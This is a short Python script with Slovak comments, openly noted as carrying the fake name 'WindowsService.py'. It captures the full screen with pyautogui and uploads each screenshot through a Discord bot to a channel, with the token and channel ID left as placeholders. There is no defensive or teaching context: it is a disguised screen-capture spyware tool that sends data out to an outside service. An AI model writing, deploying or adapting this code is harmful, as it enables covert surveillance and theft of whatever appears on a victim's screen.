#WindowsService.py IS JUST FAKE NAME.

import discord
import pyautogui
import datetime

# Konfigurácia Discord bota
TOKEN = 'tu_vlozte_discord_token'
CHANNEL_ID = 'tu_vlozte_channel_id'

# Vytvorenie inštancie klienta Discord
client = discord.Client()

@client.event
async def on_ready():
    print('Prihlásený ako {0.user}'.format(client))

    # Získanie aktuálneho času pre vytvorenie unikátneho názvu súboru
    current_time = datetime.datetime.now().strftime("%Y%m%d%H%M%S")

    # Screenshot celej obrazovky
    screenshot = pyautogui.screenshot()

    # Uloženie screenshotu s unikátnym názvom
    screenshot_path = f'{current_time}.png'
    screenshot.save(screenshot_path)
    print('Screenshot uložený:', screenshot_path)

    # Odoslanie screenshotu na Discord server
    channel = client.get_channel(CHANNEL_ID)
    await channel.send(file=discord.File(screenshot_path))
    print('Screenshot odoslaný na Discord server')

# Spustenie klienta Discord
client.run(TOKEN)
